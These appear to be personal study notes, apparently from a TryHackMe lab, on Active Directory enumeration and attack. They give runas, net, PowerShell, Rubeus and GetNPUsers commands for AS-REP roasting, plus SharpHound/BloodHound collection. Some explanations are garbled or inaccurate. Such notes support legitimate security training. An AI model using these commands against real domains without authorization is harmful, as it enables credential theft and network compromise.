# RUNAS 
runas.exe /netonly /user:<domain>\<username> cmd.exe


runas allow ton login as user without authentifiate to the controler, the netonly controler.

## SYSVOL
a folder existing in all Active directory, contains all GPO (Group Policy Object).

## DNS 
a dns need to be configured sometime the DNS is configured on login but sometime we need to configure it manually .

Set-DnsClientServerAddress -InterfaceIndex $index -ServerAddresses $dnsip


# IP VS DNS 
use the DNS to go to the dir will use kerberos to authentificate.
but because kerberos use the DNS to inject auth if we use the IP to go to a network auth that will use NTLM /

# RSAT 
is a GUI enumeration tech 

1 - search for optioanl feature RSAT 
2 - go in the MMC (management console ) use Runas to login in 
3 - File -> Add/Remove Snap-in
4 - Right-click on Active Directory Domains and Trusts and select Change Forest
Right-click on Active Directory Sites and Services and select Change Forest
Enter {domain} as the Root domain and Click OK
Right-click on Active Directory Users and Computers and select Change Domain
Enter {domain} as the Domain and Click OK
Right-click on Active Directory Users and Computers in the left-hand pane
Click on View -> Advanced Features


# AS-REP Roasting

its a technique to get the password from  the kerberos . 
some users can have disabled the feature of pre-auth keberos (avoid to send the timespan with the key).
with this we can recover the password. this attah have 2 phase : 

## enumeration :

### Rubeus (Windows only): 

Rubeus.exe asreproast

### Impacketâ€™s GetNPUsers.py (Linux/Windows): 

GetNPUsers.py tryhackme.loc/ -dc-ip {DC-IP} -usersfile {userfile} -format hashcat -outputfile hashes.txt -no-pass

to do that we will enumerate the user file and he will try each user 

# CMD
## whoiam

whoami /all

## net command 
some command are used to listed the domain object, linited to 10.
these command work only on a domain joined network. but to have local info remove the /domain at the end 
net user /domain # list all user
net user {special user } /domain # list for specific user
net group  /domain # list all goup
net group {special goup} /domain # list specific group
net accounts /domain # list password policy 

# POWERSHELL 

Get-ADUser -Identity gordon.stevens -Server {domain} -Properties * # list porperty of a special user
Get-ADUser -Filter 'Name -like "*{something}"' -Server {domain} -Properties * # list user based on progile
Get-ADComputer -Filter * 
Get-ADGroup -Identity {GROUP} -Server {domain}

Get-ADGroupMember -Identity Administrators -Server za.tryhackme.com # enumerate account in group

Get-ADObject # GET a object in AD 

Get-ADDomain -Server {domain}

Set-ADAccountPassword # change password 

#PowerView

TO COMPLETE 

# Bloodhound. 
Bloodhound is the most powerful AD enumeration tool to date

Bloodohund  allow to see AD attack in a graph way ! 
to attack with Bloodhound we need to use Sharphound a attack vector in 3 way : 
- Sharphound.ps1 
- Sharphound.exe 
- AzureHound.ps1

fer exemple the exe will be used like :
 
 Sharphound.exe --CollectionMethods <Methods> --Domain za.tryhackme.com --ExcludeDCs

the Collection method can be : 

- all 
a zip will be generated for our bloodhund 

# Run bloodhund 

to run bloodhund we need : 
- docker 
- cloodhund cli